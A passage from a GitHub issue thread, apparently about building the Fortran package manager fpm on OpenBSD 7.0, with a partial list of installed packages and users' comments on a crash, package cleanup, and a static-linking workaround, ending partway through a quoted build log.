GStreamer\ngstreamer1-plugins-good-1.18.4p0 good elements for GStreamer\ngstreamer1-plugins-libav-1.18.4 ffmpeg elements for GStreamer\ngtar-1.34           GNU version of the traditional tape archiver\ngtk+2-2.24.33p0     multi-platform graphical toolkit\ngtk+2-cups-2.24.33  gtk+2 CUPS print backend\ngtk+3-3.24.30       multi-platform graphical toolkit\ngtk+3-cups-3.24.30  gtk+3 CUPS print backend\ngtk+4-4.2.1         multi-platform graphical toolkit\ngtk-engines2-2.20.2p11 collection of theme engines for GTK+2\ngtk-update-icon-cache-3.24.30 gtk+ icon theme caching utility\ngtk-vnc-1.2.0       VNC viewer widget for GTK\ngtk3mm-3.24.5       C++ interface for gtk3+\ngtksourceview4-4.8.1p0 text widget that extends the GTK3 GtkTextView widget\ngupnp-1.2.7         framework for creating UPnP devices and control points\ngupnp-av-0.12.11p2  helpers for building A/V applications using GUPnP\ngupnp-dlna-0.10.5p2 DLNA integration for GUPnP\ngupnp-igd-1.2.0     library to handle UPnP IGD port mapping\ngvfs-1.48.1         GNOME Virtual File System\ngvfs-goa-1.48.1     GVFS volume monitor for gnome-online-account\ngvfs-google-1.48.1  GVFS mount module for Google Drive\ngvfs-smb-1.48.1     GVFS mount module for samba\nharfbuzz-2.9.0      text shaping library\nharfbuzz-icu-2.9.0  ICU support for libharfbuzz\nheimdal-libs-7.7.0p1 Heimdal libraries and headers\nhicolor-icon-theme-0.17 fallback theme of the icon theme specification\nhighlight-3.62      convert source code to markup formats\nhunspell-1.7.0      spelling, stemming, morphological analysis and generation\nhwdata-0.350        hardware identification and configuration data\nhyphen-2.8.8        text hyphenation library\nibus-1.5.24p0       intelligent input bus framework\nibus-anthy-1.5.12p0 japanese input engine for ibus\nibus-gtk2-1.5.24    IBus IM module for GTK2\nibus-gtk4-1.5.24    IBus IM module for GTK4\nicu4c-69.1v0        International Components for Unicode\nijs-0.35p3          raster image transmission library\ninteldrm-firmware-20201218 firmware binary images for inteldrm(4) driver\niso-codes-4.5.0     lists of the country, language and currency iso names\niwx-firmware-20210512 firmware binary images for iwx(4) driver\njansson-2.13.1      library for manipulating JSON data\njasper-2.0.32       reference implementation of JPEG-2000\njbig2dec-0.11       decoder for JBIG2 monochrome hi-res image compression format\njbigkit-2.1         lossless image compression library, with lightweight version\njpeg-2.1.0v0        SIMD-accelerated JPEG codec replacement of libjpeg\njson-glib-1.6.2     JSON parser for GLib-based libraries and applications\njsonrpc-glib-3.38.0 JSON-RPC library for GLib\nlame-3.100p1        lame ain't an MP3 encoder\nlapack-3.8.0p1      library of Fortran linear algebra subroutines\nlcdf-typetools-2.108 tools to manipulate font files\nlcms2-2.12          color management library\nldb-2.3.0p1v0       LDAP-like embedded database\nlibadwaita-1.0.0alpha1 building blocks for modern adaptive GNOME apps\nlibao-1.2.0p1       portable audio output library\nlibarchive-3.5.1    multi-format archive and compression library\nlibass-0.15.0       portable ASS/SSA subtitle renderer\nlibassuan-2.5.5     IPC library used by GnuPG and gpgme\nlibb2-0.98.1v0      library providing BLAKE2b, BLAKE2s, BLAKE2bp, BLAKE2sp\nlibcanberra-0.30p4  implementation of the Freedesktop sound theme spec.\nlibcanberra-gtk-0.30p8 gtk+2 helper for libcanberra\nlibcanberra-gtk3-0.30p8 gtk+3 helper for libcanberra\nlibchamplain-0.12.20 library to provide a GTK+ widget to display maps\nlibcue-1.4.0p1      cue sheet parser library\nlibdaemon-0.14p1    lightweight C library that eases the writing of daemons\nlibdazzle-3.40.0    companion library to GObject and Gtk+\nlibde265-1.0.7      open H.265 video codec implementation\nlibevent-2.1.11     event notification library\nlibexif-0.6.22      extract digital camera info tags from JPEG images\nlibffi-3.3p1        Foreign Function Interface\nlibgcrypt-1.9.4     crypto library based on code used in GnuPG\nlibgdata-0.18.1     Google Data API based Glib client library\nlibgee-0.20.4       GObject based collection library\nlibgepub-0.6.0p2    GObject based library for rendering epub docs\nlibgexiv2-0.12.3    GObject wrapper around exiv2\nlibgfbgraph-0.2.4   GObject library for Facebook Graph API\nlibgnomekbd-3.26.1p0 keyboard configuration library\nlibgpg-error-1.42   error codes for GnuPG related software\nlibgsf-1.14.47      GNOME Structured File library\nlibgtop2-2.40.0p1   portable library for obtaining system information\nlibgweather-40.0p0  weather information access library\nlibgxps-0.3.2       GObject library for handling and rendering XPS documents\nlibhandy-1.2.3      building blocks for modern adaptive GNOME apps\nlibheif-1.12.0      HEIF and AVIF file format decoder and encoder\nlibical-3.0.10      implementation of the iCalendar protocols and data units\nlibical-glib-3.0.10 GObject wrapper for libical library\nlibiconv-1.16p0     character set conversion library\nlibidn2-2.3.0p0     implementation of IDNA2008 internationalized domain names\nlibiptcdata-1.0.4p2 library for manipulating IPTC metadata\nlibksba-1.6.0       X.509 library\nliblouis-3.16.1     braille translator, back-translator and formatter\nlibltdl-2.4.2p2     GNU libtool system independent dlopen wrapper\nlibmediaart-1.9.5   media art extraction and cache management library\nlibmpc-1.1.0        arbitrary-precision complex numbers math library\nlibmusicbrainz5-5.0.1p5 library for audio metadata lookup (v5)\nlibnettle-3.7.3     cryptographic library\nlibnotify-0.7.9     send desktop notifications to a notification daemon\nliboauth-1.0.3      library implementing the OAuth Core RFC 5849 standard\nlibogg-1.3.5        Ogg bitstream library\nlibosinfo-1.9.0     library for managing information about operating systems\nlibotf-0.9.16       library for handling OpenType Fonts\nlibpaper-1.1.28     library for handling paper characteristics\nlibpeas-1.30.0      gobject-based plugins engine\nlibphonenumber-8.12.28 C++ library to parse/format/validate phone numbers\nlibproxy-0.4.17     library handling all the details of proxy configuration\nlibpsl-0.21.1       public suffix list library\nlibpst-0.6.76       read and convert Microsoft Outlook mail files\nlibpwquality-1.4.4p0 library to generate, and check strengh of passwords\nlibraw-0.20.2       library for reading RAW files\nlibreoffice-7.1.5.2v0 multi-platform productivity suite\nlibrest-0.8.1p0     access web services that claim to be RESTful\nlibrsvg-2.50.7      SAX-based render library for SVG files\nlibsamplerate-0.1.9 audio sample rate conversion library\nlibsecret-0.20.4    library for storing and retrieving passwords and secrets\nlibshout-2.4.5      library for communicating with an icecast server\nlibsigc++-2.10.7    callback framework for C++\nlibsigsegv-2.12     library for handling page faults in user mode\nlibsndfile-1.0.31   library to handle various audio file formats\nlibsodium-1.0.18p1  library for network communications and cryptography\nlibsoup-2.72.0      HTTP client/server library for GNOME\nlibspectre-0.2.8p3  library for rendering Postscript documents\nlibstemmer-2.1.0    stemming algorithms for text processing\nlibtalloc-2.3.2     hierarchical memory pool system with destructors\nlibtasn1-4.17.0     Abstract Syntax Notation One structure parser library\nlibtheora-1.2.20190601p0 open video codec\nlibunbound-1.13.2   validating DNS resolver library\nlibunistring-0.9.7  manipulate Unicode strings\nlibusb1-1.0.23p2    library for USB device access from userspace\nlibv4l-1.20.0p0     libv4l userspace library\nlibvidstab-1.1.0    video stabilization library\nlibvorbis-1.3.7     audio compression codec library\nlibvpx-1.10.0v0     Google VP8/VP9 video codec\nlibwebp-1.2.0       Google WebP image format conversion tool\nlibxkbcommon-1.3.0  library to handle keyboard descriptions\nlibxklavier-5.4     utility library for XKB\nlibxml-2.9.12       XML parsing library\nlibxslt-1.1.34p1    XSLT C Library for GNOME\nlibyajl-2.1.0       small JSON library written in ANSI C\nlibyaml-0.2.2       YAML 1.1 parser and emitter written in C\nlibytnef-1.9.3p1    read and convert TNEF files\nlibzapojit-0.0.3p4  GLib/GObject wrapper for SkyDrive and Hotmail REST APIs\nllvm-11.1.0p6       modular, fast C/C++/ObjC compiler, static analyzer and tools\nlua-5.3.6           powerful, light-weight programming language (version 5.3.6)\nlz4-1.9.3p0         fast BSD-licensed data compression\nlzo2-2.10p2         portable speedy lossless data compression library\nm17n-db-1.8.0       database for multilingual text processing library\nm17n-lib-1.8.0p2    multilingual text processing library\nmariadb-client-10.6.4v1 multithreaded SQL database (client)\nmeta-tracker-2.3.6p1 metadata database and search tool\nmosh-1.3.2p5        mobile shell\nmozilla-dicts-en-GB-1.3p1 en-GB dictionary for Mozilla\nmpfr-4.1.0          library for multiple-precision floating-point computations\nmutter-40.3         window and compositing manager\nnautilus-40.2       GNOME file manager\nneofetch-7.1.0      system information tool written in bash\nneon-0.31.2         HTTP and WebDAV client library, with C interface\nnghttp2-1.44.0      library for HTTP/2\nnpth-1.6            new GNU Portable Threads Library\nnspr-4.32           Netscape Portable Runtime\nnss-3.69            libraries to support development of security-enabled apps\nopenjp2-2.4.0       open-source JPEG 2000 codec library\nopenldap-client-2.4.59 open-source LDAP software (client)\nopenpam-20200510    Pluggable Authentication Module\nopus-1.3.1          IETF audio codec\norc-0.4.29          library and toolset to operate arrays of data\norca-40.0           assistive screen reader\nosinfo-db-20210809  osinfo database files\np11-kit-0.24.0      library for loading and enumerating PKCS#11 modules\np5-Convert-BinHex-1.125p0 module to extract data from Macintosh BinHex files\np5-Error-0.17029    error/exception handling in an OO-ish way\np5-IO-stringy-2.113 in-core objects like strings and arrays for I/O\np5-IPC-Run3-0.048p0 run a subprocess in batch mode\np5-MIME-tools-5.509p0 modules for parsing (and creating) MIME entities\np5-Mail-Tools-2.21p0 modules for handling mail with perl\np5-Time-TimeDate-2.33 library for parsing and formatting dates and times\np7zip-16.02p6       file archiver with high compression ratio\npango-1.48.9        library for layout and rendering of text\npangomm-2.46.1      C++ interface for pango\npcre-8.44           perl-compatible regular expression library\npcre2-10.36         perl-compatible regular expression library, version 2\npinentry-1.1.1      PIN or passphrase entry dialog (ncurses interface)\npinentry-gnome3-1.1.1 PIN or passphrase entry dialog (GNOME 3 interface)\npng-1.6.37          library for manipulating PNG images\npolkit-0.119        framework for granting privileged operations to users\npoppler-21.05.0p0   PDF rendering library\npoppler-data-0.4.9  encoding files for poppler\npopt-1.16p2         getopt(3)-like library with a number of enhancements\nportaudio-svn-1960  portable cross-platform audio API\npostgresql-client-13.3p0 PostgreSQL RDBMS (client)\nprotobuf-3.17.3     c++ protocol buffers\nps2eps-1.68p0       convert Postscript to Encapsulated Postscript\npsutils-2.06        utilities for manipulating PostScript documents\npulseaudio-15.0     cross-platform networked sound server\npy-dbus-common-1.2.18 common files for py-dbus\npy3-MarkupSafe-1.1.1p2 implements an XML/HTML/XHTML markup safe string\npy3-atspi-2.38.1    python bindings for at-spi2\npy3-beaker-1.10.0p2 session and caching library with wsgi middleware\npy3-brotli-1.0.9p0  Python bindings for the Brotli compression library\npy3-cairo-1.20.1    cairo bindings for Python\npy3-certifi-2020.4.5.1p1 Python package to check certificates using the OpenBSD CA\npy3-chardet-4.0.0p0 character encoding auto-detection in Python\npy3-cryptodome-3.10.1p0 self-contained cryptographic library for Python\npy3-cups-2.0.1p1    CUPS bindings for Python\npy3-curl-7.44.1     Python interface to cURL library\npy3-dbus-1.2.18     dbus bindings for Python\npy3-dnspython-2.1.0 DNS toolkit for Python\npy3-gobject3-3.40.1 Python bindings for GLib and GObject\npy3-idna-2.10p0     Python library to support the IDNA protocol\npy3-jedi-0.18.0     autocompletion tool for Python\npy3-lxml-4.3.3p5    Python binding for the libxml2 and libxslt libraries\npy3-mako-1.1.1p2    super-fast templating language\npy3-markdown-2.6.11p5 text-to-HTML conversion tool\npy3-parso-0.8.2     python parser\npy3-requests-2.26.0 elegant and simple HTTP library for Python\npy3-setproctitle-1.2.2 library for getting/setting process names\npy3-setuptools-57.4.0v0 simplified packaging system for Python modules\npy3-talloc-2.3.2    Python 3.8 bindings for talloc\npy3-tdb-1.4.3       Python 3.8 bindings for tdb\npy3-urllib3-1.26.6  HTTP library for Python\npy3-xdg-0.27p0      python library to access freedesktop.org standards\npython-3.8.11p0     interpreted object-oriented programming language\nquirks-4.33         exceptions to pkg_add rules\nraptor-2.0.15p4     RDF Parser Toolkit for Redland\nrasqal-0.9.33p2     RDF Query Library for Redland\nredland-1.0.17p6    high-level interface for RDF\nrofi-1.6.1p0        window switcher, run dialog and dmenu replacement\nruby-2.7.4p1        object oriented script language with threads\nsamba-4.14.6v0      SMB and CIFS client and server for UNIX\nsamba-util-4.14.6v0 common libraries for Samba suite\nsane-backends-1.0.32p1 API for accessing scanners, backends\nsdl2-2.0.16         cross-platform multimedia library\nshared-mime-info-2.1 shared mime database for desktops\nsimple-scan-40.1    simple scanning utility\nsound-theme-freedesktop-0.8p0 XDG sound theme\nspeech-dispatcher-0.10.2p0 common interface to speech synthesis\nspeex-1.2.0         patent-free speech codec\nspeexdsp-1.2.0      speech processing DSP library\nspidermonkey78-78.12.0v1 C/C++ Mozilla's JavaScript engine implementation \nsqlite3-3.35.5p0    embedded SQL implementation\nstartup-notification-0.12p8 library for tracking application startup\nstow-2.3.1          manages software package installations with symlinks\nsuitesparse-4.4.6p3 suite of sparse matrix algorithms\nsushi-3.38.1        quick previewer for Nautilus\nsystem-config-printer-1.5.15 printer (CUPS) administration tool\nt1utils-1.42        utilities for PostScript Type 1 fonts\ntaglib-1.11.1p3     managing meta-data of audio formats\ntdb-1.4.3           trivial database library\ntelepathy-glib-0.24.2 flexible communications framework, glib bindings\ntelepathy-logger-0.8.2p6 flexible communications framework, logger component\ntelepathy-mission-control-5.16.6 abstraction layer between apps and connection managers\ntemplate-glib-3.34.0 templating library for GLib\ntepl-6.00.0         Text Editor Product Line\ntevent-0.10.2p1v0   event system based on talloc\ntexlive_base-2020p0 base binaries for TeXLive typesetting distribution\ntexlive_mktexlsr-2020p0 mktexlsr for TeXLive typesetting distribution\ntexlive_synctex-2020p0 synctex for TeXLive typesetting distribution\ntexlive_texmf-buildset-2020p0 smallest texlive texmf for building ports\ntiff-4.3.0          tools and library routines for working with TIFF images\ntotem-3.38.1        official media player for GNOME\ntotem-pl-parser-3.26.6 GObject-based parsing library\ntracker-miners-2.3.5p2 tracker miners and metadata extractors\ntracker3-3.0.4      efficient search engine and triplestore\ntracker3-miners-3.0.5p0 tracker miners and metadata extractors\ntwolame-0.3.13p1    optimised MPEG Audio Layer 2 (MP2) encoder\nunoconv-0.7p8       UNiversal Office CONVerter\nunrar-6.02v2        extract, list, and test RAR archives\nunzip-6.0p14        extract, list & test files in a ZIP archive\nupower-0.99.11p0    userland power management interface\nuvideo-firmware-1.2p3 firmware binary images for uvideo(4) driver\nvim-8.2.3357-gtk3-perl-python3-ruby vi clone, many additional features\nvmm-firmware-1.14.0 firmware binary images for vmm(4) driver\nvte3-0.64.2         terminal emulation library\nwavpack-5.4.0       audio codec for lossless, lossy and hybrid compression\nwebkitgtk4-2.32.3   GTK+ port of the WebKit rendering engine\nwoff2-1.0.2p0       Web Open Font Format 2.0 library\nx264-20210415       free H.264/MPEG-4 AVC encoder\nx265-3.5            free H.265/HEVC encoder\nxcape-1.2           configure a modifier key when pressed and released by itself\nxclip-0.13p1        command line interface to X selections\nxdg-user-dirs-0.17p1 utilities to manage well known user directories\nxdg-user-dirs-gtk-0.10p4 integration of xdg-user-dirs into GNOME/gtk+\nxdg-utils-1.1.3p1   utilities to assist desktop integration tasks\nxvidcore-1.3.7      ISO MPEG-4 compliant video codec\nxz-5.2.5            LZMA compression and decompression tools\nyelp-40.3           GNOME help browser\nyelp-xsl-40.2       XSLT stylesheets for yelp\nzenity-3.32.0p0     dialogs for GNOME\nzip-3.0p1           create/update ZIP files compatible with PKZip(tm)\nzstd-1.5.0          zstandard fast real-time compression algorithm\nzziplib-0.13.62p1   lightweight library for extracting data from zip files",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-08-29 02:39:25+00:00",
                    "text": "@AshyIsMe thank you for the bug report.\nFor reference, these are the lines fpm.F90:7128-fpm.F90:7130\n      list=[ list(:place-1)]\n   else\n      list=[ list(:place-1), list(place+1:) ]\nI believe something has changed in openbsd version 7.0, since install.sh worked in my openbsd-6.9. I'll try to update my openbsd vm."
                },
                {
                    "user": "AshyIsMe",
                    "date": "2021-08-29 04:54:27+00:00",
                    "text": "Just a quick note on swapping between gfortran 8.4 and 11.2 on OpenBSD 7.0 snapshots:\nI had to do an extra step to cleanup after uninstalling a particular version:\n$ doas pkg_delete g95\n$ doas pkg_delete -a    # Removes any dependencies that are no longer needed\n\nIf I did not do the pkg_delete -a then I was unable to install the other version of g95 due to dependency clashes."
                },
                {
                    "user": "brocolis",
                    "date": "2021-08-30 03:26:26+00:00",
                    "text": "Thanks for the cleanup instructions.\nNow it works for me on OpenBSD 7.0 with gcc-11.2.0:\ngit clone https://github.com/fortran-lang/fpm.git\ncd fpm\nFC=egfortran ./install.sh"
                },
                {
                    "user": "AshyIsMe",
                    "date": "2021-08-30 09:05:21+00:00",
                    "text": "Hmm, I still have the same behavior on my OpenBSD machine.\ndoas sysupgrade says I'm still on the latest snapshot and I can't see any new commits on the fpm repo.\nIs there a change you made that's missing from the repo?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-08-30 13:40:10+00:00",
                    "text": "I had to run pkg_delete gcc-libs-8.4.0p6.  I think my fpm/build directory was in invalid state with some files built with gcc-8, and others built with gcc-11, so I removed everything and started again in a clean directory."
                },
                {
                    "user": "AshyIsMe",
                    "date": "2021-08-31 11:38:30+00:00",
                    "text": "Hmm, by default with a fresh clone and install I still see the same ldconfig error.\nBut as per your note on irc the other day, using -static does successfully build and install.\nAny ideas why -static would be required?\nInterestiingly, when fpm is built like this I also get linker errors when trying to build a small test project https://github.com/AshyIsMe/flox unless I pass in fpm run --flag -static\nSuccessful build with static option:\n$ FC=egfortran FFLAGS=-static ./install.sh\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   621  100   621    0     0   4193      0 --:--:-- --:--:-- --:--:--  4253\n100  826k  100  826k    0     0  1878k      0 --:--:-- --:--:-- --:--:-- 1878k\n + mkdir -p build/dependencies\nhint: Using 'master' as the name for the initial branch. This default branch name\nhint: is subject to change. To configure the initial branch name to use in all\nhint: of your new repositories, which will suppress this warning, call:\nhint:\nhint:   git config --global init.defaultBranch <name>\nhint:\nhint: Names commonly chosen instead of 'master' are 'main', 'trunk' and\nhint: 'development'. The just-created branch can be renamed via this command:\nhint:\nhint:   git branch -m <name>\nInitialized empty Git repository in /home/aaron/tmp/fpm/build/dependencies/toml-f/.git/\nremote: Enumerating objects: 115, done.\nremote: Counting objects: 100% (115/115), done.\nremote: Compressing objects: 100% (104/104), done.\nremote: Total 115 (delta 27), reused 47 (delta 8), pack-reused 0\nReceiving objects: 100% (115/115), 105.17 KiB | 595.00 KiB/s, done.\nResolving deltas: 100% (27/27), done.\nFrom https://github.com/toml-f/toml-f\n * branch            2f5eaba864ff630ba0c3791126a3f811b6e437f3 -> FETCH_HEAD\nhint: Using 'master' as the name for the initial branch. This default branch name\nhint: is subject to change. To configure the initial branch name to use in all\nhint: of your new repositories, which will suppress this warning, call:\nhint:\nhint:   git config --global init.defaultBranch <name>\nhint:\nhint: Names commonly chosen instead of 'master' are 'main', 'trunk' and\nhint: 'development'. The just-created branch can be renamed via this command:\nhint:\nhint:   git branch -m <name>\nInitialized empty Git repository in /home/aaron/tmp/fpm/build/dependencies/M_CLI2/.git/\nremote: Enumerating objects: 191, done.\nremote: Counting objects: 100% (191/191), done.\nremote: Compressing objects: 100% (110/110), done.\nremote: Total 191 (delta 93), reused 156 (delta 80), pack-reused 0\nReceiving objects: 100% (191/191), 1.08 MiB | 1.41 MiB/s, done.\nResolving deltas: 100% (93/93), done.\nFrom https://github.com/urbanjost/M_CLI2\n * branch            ea6bbffc1c2fb0885e994d37ccf0029c99b19f24 -> FETCH_HEAD\n + mkdir -p build/egfortran_5B763526CFC63AF4/fpm\n + egfortran -c ././src/filesystem_utilities.c -o build/egfortran_5B763526CFC63AF4/fpm/src_filesystem_utilities.c.o\n + egfortran -c ././src/fpm_strings.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_strings.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/constants.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_constants.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/version.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_version.f90.o\n + egfortran -c build/dependencies/M_CLI2/src/M_CLI2.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_M_CLI2_src_M_CLI2.f90.o\n + egfortran -c ././src/fpm/error.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_error.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/datetime.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_datetime.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/error.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_error.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/utils/verify.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils_verify.f90.o\n + egfortran -c test/fpm_test/testsuite.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_testsuite.f90.o\n + egfortran -c ././src/fpm_environment.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_environment.f90.o\n + egfortran -c ././src/fpm_os.F90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_os.F90.o\n + egfortran -c ././src/fpm/versioning.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_versioning.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/utils/convert.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils_convert.f90.o\n + egfortran -c test/fpm_test/test_versioning.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_versioning.f90.o\n + egfortran -c ././src/fpm_filesystem.F90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_filesystem.F90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/utils.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_utils.f90.o\n + egfortran -c test/fpm_test/test_filesystem.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_filesystem.f90.o\n + egfortran -c test/help_test/help_test.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_help_test_help_test.f90.o\n + egfortran -c test/new_test/new_test.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_new_test_new_test.f90.o\n + egfortran -c ././src/fpm_command_line.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_command_line.f90.o\n + egfortran -c ././src/fpm_compiler.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_compiler.f90.o\n + egfortran -c ././src/fpm/git.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_git.f90.o\n + egfortran -c ././src/fpm/installer.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/src_fpm_installer.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/type/value.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_value.f90.o\n + egfortran -c test/fpm_test/test_installer.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/test_fpm_test_test_installer.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/structure/base.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure_base.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/type/keyval.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_keyval.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/structure/vector.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure_vector.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/structure.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_structure.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/type/array.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_array.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/type/table.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type_table.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/type.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_type.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/ser.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_ser.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/build/keyval.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_keyval.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/build/merge.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_merge.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/de/tokenizer.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de_tokenizer.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/build/array.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_array.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/build/table.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_build_table.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/de/character.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o build/egfortran_5B763526CFC63AF4/fpm/build_dependencies_toml-f_src_tomlf_de_character.f90.o\n + egfortran -c build/dependencies/toml-f/src/tomlf/build.f90 -static -J build/egfortran_5B763526CFC63AF4/fpm -I build/egfortran_5B763526CFC63AF4/fpm  -o 